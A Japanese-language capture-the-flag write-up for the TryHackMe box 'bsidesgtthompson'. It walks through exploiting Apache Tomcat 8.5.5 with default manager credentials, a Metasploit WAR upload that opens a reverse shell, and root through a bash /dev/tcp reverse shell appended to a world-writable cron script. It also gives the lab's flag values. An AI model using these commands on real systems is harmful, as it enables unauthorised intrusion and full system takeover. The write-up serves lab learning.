---
tags: [hacking, box, writeup]
platform: TryHackMe
difficulty: Easy
status: completed
date: 2026-03-27
skills:
  - Ghostcat (CVE-2020-1938)
  - AJP13
  - Apache Tomcat
  - Tomcat Manager WAR Upload RCE
  - Cron Job Hijacking
---

# bsidesgtthompson

**プラットフォーム**: TryHackMe
**難易度**: Easy
**OS**: Linux

---

## 情報収集

### Nmap

```bash
nmap -sC -sV -T4 <TARGET_IP>
```

**開いているポート:**
| ポート | サービス | バージョン |
|-------|---------|----------|
| 22/tcp | SSH | OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 |
| 8009/tcp | AJP13 | Apache Jserv Protocol v1.3 |
| 8080/tcp | HTTP | Apache Tomcat 8.5.5 |

### ディレクトリ列挙

```bash
gobuster dir -u http://<TARGET_IP>:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
```

**発見したパス:**
| パス | ステータス |
|------|---------|
| `/docs` | 302 |
| `/examples` | 302 |
| `/manager` | 302 |

---

## 脆弱性発見

### Ghostcat (CVE-2020-1938)

AJP13 (8009) が外部公開されており、Tomcat 8.5.5 は脆弱なバージョン（修正版: 8.5.51+）。

```bash
# Metasploit で実行
use auxiliary/admin/http/tomcat_ghostcat
set RHOSTS <TARGET_IP>
set RPORT 8009
run
```

**結果**: 攻撃は成功しなかった。
カスタムアプリがデプロイされていないため、読み取れる有用なファイルが存在しなかった。
Ghostcatが有効なのは「カスタムアプリの `web.xml` 等に認証情報が含まれている」場合に限られる。

### AJP (Apache JServ Protocol) とは

```
[ブラウザ] --HTTP--> [Apache httpd] --AJP--> [Tomcat]
```

WebサーバーとJavaアプリケーションサーバー間の内部通信プロトコル。
設定ミスで `0.0.0.0` にバインドされると外部から直接アクセス可能になる。

### Tomcat Manager 認証情報

401エラーページにデフォルト認証情報のヒントが記載されていた。

```
GET /manager/html → 401 Unauthorized
ページ内に記載: username="tomcat" password="s3cret"
```

```bash
curl -u "tomcat:s3cret" http://<TARGET_IP>:8080/manager/html
# → 200 OK ログイン成功！
```

**取得した認証情報**: `tomcat:s3cret`

---

## 侵入 / Initial Access

### Tomcat Manager WAR Upload → RCE

```bash
# Metasploit で WAR 生成・アップロード・実行を自動化
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS <TARGET_IP>
set RPORT 8080
set HttpUsername tomcat
set HttpPassword s3cret
set LHOST <自分のIP>
set LPORT 4444
set PAYLOAD java/shell_reverse_tcp
run
```

**結果**: `uid=1001(tomcat) gid=1001(tomcat)` でシェル取得

**ユーザーフラグ**: `39400c90bc683a41a8935e4719f181bf`
場所: `/home/jack/user.txt`

---

## 権限昇格 / Privilege Escalation

### Cron Job Hijacking

crontab にrootが実行するスクリプトを発見：

```bash
cat /etc/crontab
# *  *  * * *  root  cd /home/jack && bash id.sh
```

`id.sh` のパーミッションを確認：

```
-rwxrwxrwx 1 jack jack 26 Aug 14 2019 id.sh
```

**全員が書き込み可能！** リバースシェルを追記：

```bash
echo 'bash -i >& /dev/tcp/<自分のIP>/4451 0>&1' >> /home/jack/id.sh
```

ncリスナーで待機（cronが1分以内に実行）：

```bash
# Metasploit handler
use exploit/multi/handler
set PAYLOAD cmd/unix/reverse_bash
set LHOST <自分のIP>
set LPORT 4451
run
```

**結果**: `uid=0(root) gid=0(root) groups=0(root)` で root シェル取得

**ルートフラグ**: `d89d5391984c0450a95497153ae7ca3a`
場所: `/root/root.txt`

---

## 習得スキル・学び

- AJP13プロトコルの役割と危険性（外部公開は危険）
- Ghostcat (CVE-2020-1938) の仕組みと限界（アプリ内ファイルのみ読み取り可能）
- Tomcat Manager の 401 エラーページにデフォルト認証情報のヒントが含まれる場合がある
- Tomcat Manager へのアクセスは WAR デプロイによる RCE に直結する
- Cron Job Hijacking: root実行スクリプトのパーミッションが甘い場合に権限昇格可能

## ハマったポイント

- Ghostcatに該当するTomcatバージョン（8.5.5）だったが攻撃は成功しなかった（カスタムアプリ未デプロイのため有用な情報なし）
- Metasploit の `tomcat_mgr_login` ブルートフォースでは `s3cret` がヒットしなかった → 401ページを手動確認してヒントを発見
- Metasploit の非対話モードではセッション操作に工夫が必要（`sessions -c` コマンド活用）

## 参考にしたリソース

- [Ghostcat CVE-2020-1938](https://www.exploit-db.com/exploits/48143)
